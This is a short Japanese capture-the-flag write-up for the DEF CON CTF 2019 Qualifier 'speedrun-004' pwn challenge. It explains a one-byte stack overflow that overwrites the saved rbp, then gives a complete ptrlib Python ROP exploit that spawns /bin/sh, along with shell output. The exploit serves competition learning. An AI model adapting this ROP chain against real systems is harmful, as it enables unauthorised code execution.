# [pwn 5pts] speedrun-004 - DEF CON CTF 2019 Qualifier
64ビットでSSPやPIEは無効です。
```
$ checksec -f speedrun-004
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols      No	0		0	speedrun-004
```
バッファに入力するサイズを指定できます。
入力サイズはチェックされますが、1バイトだけオーバーフローがあります。
これによりsaved rbpが書き換えられるので、確率的にリターンアドレスを自分の用意したスタック上の値に変更できます。
以前Securinets CTFで解いた問題と同様にret gadgetで成功確率を高めましょう。
`/bin/sh`という文字はバイナリ中にありませんでしたが、~~`sh`があったのでこれを使ってROPします。~~
`sh`だとsyscallが失敗したので`/bin/sh`を作ります。

```python
from ptrlib import *

libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
elf = ELF("./speedrun-004")

#sock = Socket("speedrun-004.quals2019.oooverflow.io", 31337)
sock = Process("./speedrun-004")

sock.recvuntil("say?\n")
sock.send(str(0x101))

addr_read = 0x44a140
rop_pop_rdi = 0x00400686
rop_pop_rax = 0x00415f04
rop_pop_rsi = 0x00410a93
rop_pop_rdx = 0x0044c6b6
rop_pop_rsp = 0x00401e43
rop_syscall = 0x00474f15
rop_ret = 0x00400416

payload = b''
# read(0, bss, 8)
payload += p64(rop_pop_rdi)
payload += p64(0)
payload += p64(rop_pop_rsi)
payload += p64(elf.section(".bss"))
payload += p64(rop_pop_rdx)
payload += p64(8)
payload += p64(rop_pop_rax)
payload += p64(0)
payload += p64(rop_syscall)
# system("/bin/sh")
payload += p64(rop_pop_rsi)
payload += p64(0)
payload += p64(rop_pop_rdx)
payload += p64(0)
payload += p64(rop_pop_rdi)
payload += p64(elf.section(".bss"))
payload += p64(rop_pop_rax)
payload += p64(59)
payload += p64(rop_syscall)
payload += b'\x00'
payload = p64(rop_ret) * ((0x100 - len(payload)) // 8 + 1) + payload

sock.recvuntil("self?\n")
sock.send(payload)

sock.send("/bin/sh\x00")

sock.interactive()
```

できた。
```
$ python solve.py 
[+] Process: Successfully created new process (PID=1094)
[ptrlib]$ Interesting thought "@", I'll take it into consideration.
id
uid=1000(ptr) gid=1000(ptr) groups=1000(ptr),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare),999(docker)
[ptrlib]$ 
```

# 感想
なかなか面白かったです。
